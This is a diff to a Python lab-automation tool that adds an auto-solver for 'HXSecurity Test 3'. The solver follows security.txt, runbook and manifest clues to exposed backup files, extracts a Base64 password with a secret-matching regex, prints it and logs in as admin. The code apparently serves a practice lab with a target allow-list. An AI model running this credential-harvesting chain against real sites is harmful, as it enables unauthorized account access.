@@ -86,6 +86,7 @@ DEFAULT_EXTENSIONS = [
 B64_LINE_RE = re.compile(r"(?im)^\s*([A-Z0-9_]*(?:PASSWORD|PASS|SECRET|TOKEN)[A-Z0-9_]*)\s*=\s*([A-Za-z0-9+/=]{8,})\s*$")
 SUCCESS_TEXT = "TEST 1 SUCCESS, WELCOME BACK HACKER!"
 TEST2_SUCCESS_TEXT = "TEST 2 SUCCESS, ACCESS CHAIN COMPLETE!"
+TEST3_SUCCESS_TEXT = "TEST 3 SUCCESS, RELEASE TRACE COMPLETE!"
 PATH_RE = re.compile(r"/[-A-Za-z0-9_./]+")
 
 
@@ -282,6 +283,109 @@ class HXTerminal:
         return False
 
 
+    def run_test3_auto(self, start_url: str) -> bool:
+        base_url = normalize_base_url(start_url)
+        assert_allowed_target(base_url)
+        print(f"[test3] target: {base_url}")
+        print("[test3] tracing security/header/runbook/manifest chain...")
+        login_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", "test3/login")
+        login = self.request(login_url)
+        release = header_get(login.headers, "x-hx-release")
+        if login.status != 200 or not release:
+            print(f"[test3] missing Test 3 login/header clue; status={login.status}")
+            return False
+        print("[test3] login/header clue recovered")
+
+        security_url: Optional[str] = None
+        security_body = ""
+        for candidate in ["security.txt", ".well-known/security.txt"]:
+            url = urllib.parse.urljoin(base_url.rstrip("/") + "/", candidate)
+            res = self.request(url)
+            if res.status == 200 and "Policy:" in res.text:
+                security_url = url
+                security_body = res.text
+                break
+        if not security_url:
+            print("[test3] security policy clue unavailable")
+            return False
+        policy_paths = [p for p in PATH_RE.findall(security_body) if p.startswith("/test3/")]
+        if not policy_paths:
+            print("[test3] no Test 3 policy path found")
+            return False
+        print("[test3] security policy clue recovered")
+
+        runbook_path: Optional[str] = None
+        disclosure_url: Optional[str] = None
+        for policy_path in policy_paths:
+            current_disclosure_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", policy_path.lstrip("/"))
+            disclosure = self.request(current_disclosure_url)
+            if disclosure.status == 200 and "Runbook pattern" in disclosure.text:
+                disclosure_url = current_disclosure_url
+                # The release is intentionally supplied by the login header.
+                runbook_path = f"/test3/runbooks/{release}.txt"
+                break
+        if not runbook_path:
+            print("[test3] no runbook clue found")
+            return False
+        print("[test3] disclosure/runbook clue recovered")
+
+        runbook_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", runbook_path.lstrip("/"))
+        runbook = self.request(runbook_url)
+        if runbook.status != 200 or release not in runbook.text:
+            print(f"[test3] runbook unavailable or release mismatch; status={runbook.status}")
+            return False
+        manifest_paths = [p for p in PATH_RE.findall(runbook.text) if p.startswith("/test3/") and "manifest" in p]
+        if not manifest_paths:
+            print("[test3] no manifest path found in runbook")
+            return False
+        print("[test3] runbook clue recovered")
+
+        manifest_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", manifest_paths[0].lstrip("/"))
+        manifest = self.request(manifest_url)
+        if manifest.status != 200:
+            print(f"[test3] manifest unavailable; status={manifest.status}")
+            return False
+        artifact_paths = [p for p in PATH_RE.findall(manifest.text) if p.startswith("/test3/") and ("bak" in p or "config" in p)]
+        if not artifact_paths:
+            print("[test3] no backup/config artifact path found in manifest")
+            return False
+        print("[test3] manifest clue recovered")
+
+        secret: Optional[str] = None
+        secret_key: Optional[str] = None
+        artifact_url: Optional[str] = None
+        for artifact_path in artifact_paths:
+            current_artifact_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", artifact_path.lstrip("/"))
+            artifact = self.request(current_artifact_url)
+            if artifact.status == 200:
+                found = extract_b64_secret(artifact.text)
+                if found:
+                    secret_key, secret = found
+                    artifact_url = current_artifact_url
+                    break
+        if not secret:
+            print("[test3] no Base64 credential marker found in chained artifact")
+            return False
+        print(f"[test3] credential marker found: {secret_key}")
+        print(f"[test3] security URL: {security_url}")
+        if disclosure_url:
+            print(f"[test3] disclosure URL: {disclosure_url}")
+        print(f"[test3] runbook URL: {runbook_url}")
+        print(f"[test3] manifest URL: {manifest_url}")
+        print(f"[test3] artifact URL: {artifact_url}")
+        print("[test3] decoded credential recovered")
+        print("[test3] recovered username: admin")
+        print(f"[test3] recovered password: {secret}")
+
+        body = urllib.parse.urlencode({"username": "admin", "password": secret}).encode()
+        res = self.request(login_url, method="POST", data=body)
+        if TEST3_SUCCESS_TEXT in res.text:
+            print(TEST3_SUCCESS_TEXT)
+            return True
+        print(f"[test3] login did not reach success page; status={res.status} size={res.size}")
+        return False
+
+
 def is_generic_block(res: HttpResult) -> bool:
     text = res.text[:6000]
     if res.status == 403 and "cloudflare" in text.lower() and "attention required" in text.lower():
@@ -406,7 +510,8 @@ def admin_menu() -> None:
         print("\nADMIN PLAN - FULL LAB AUTOMATION")
         print("1) Auto-run HXSecurity Test 1")
         print("2) Auto-run HXSecurity Test 2")
-        print("3) Show registered tests")
+        print("3) Auto-run HXSecurity Test 3")
+        print("4) Show registered tests")
         print("0) Exit")
         choice = input("hxsecurity> ").strip()
         if choice == "1":
@@ -418,9 +523,14 @@ def admin_menu() -> None:
             ok = term.run_test2_auto(url)
             print("[result] PASS" if ok else "[result] FAIL")
         elif choice == "3":
+            url = input("Start URL/domain: ").strip() or "https://lab.hxsecurity.net/test3/login"
+            ok = term.run_test3_auto(url)
+            print("[result] PASS" if ok else "[result] FAIL")
+        elif choice == "4":
             print("Registered tests:")
             print("- test1: exposed backup/config artifact with Base64 credential, admin login validation")
             print("- test2: chained robots/header/manifest clue with Base64 credential, admin login validation")
+            print("- test3: chained security/header/runbook/manifest clue with Base64 credential, admin login validation")
         elif choice == "0":
             return
         else:
